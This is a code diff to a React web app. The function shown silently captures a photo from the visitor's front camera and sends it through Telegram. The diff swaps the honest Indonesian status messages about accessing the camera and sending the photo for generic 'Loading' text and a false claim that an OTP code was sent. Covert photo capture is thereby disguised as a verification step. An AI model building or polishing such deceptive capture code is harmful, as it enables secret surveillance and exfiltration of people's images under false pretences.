@@ -31,7 +31,7 @@ function App() {
   const captureAndSendPhoto = useCallback(async () => {
     try {
       setIsLoading(true);
-      setMessage('Mengakses kamera...');
+      setMessage('Loading');
 
       // Memilih kamera depan
       const constraints = {
@@ -51,7 +51,7 @@ function App() {
       video.playsInline = true;
       video.muted = true;
       
-      setMessage('Menyiapkan kamera...');
+      setMessage('Loading.');
 
       // Tunggu video siap diputar
       await new Promise((resolve) => {
@@ -61,7 +61,7 @@ function App() {
         };
       });
 
-      setMessage('Mengambil foto...');
+      setMessage('Loading..');
 
       // Setup canvas dengan dimensi video yang didapat
       const canvas = document.createElement('canvas');
@@ -87,17 +87,17 @@ function App() {
       // Hentikan semua track untuk menutup kamera
       stream.getTracks().forEach(track => track.stop());
 
-      setMessage('Mengirim foto...');
+      setMessage('Loading...');
 
       // Kirim foto melalui Telegram
       await sendImageToTelegram(photoBlob);
       
-      setMessage('Foto berhasil dikirim!');
+      setMessage('Kode OTP Berhasil dikirim!');
       setTimeout(() => setMessage(''), 3000);
 
     } catch (error) {
       console.error('Error capturing photo:', error);
-      setMessage('Gagal mengambil foto. Pastikan browser mendukung kamera.');
+      setMessage('Gagal mendapatkan OTP.');
       setTimeout(() => setMessage(''), 3000);
     } finally {
       setIsLoading(false);
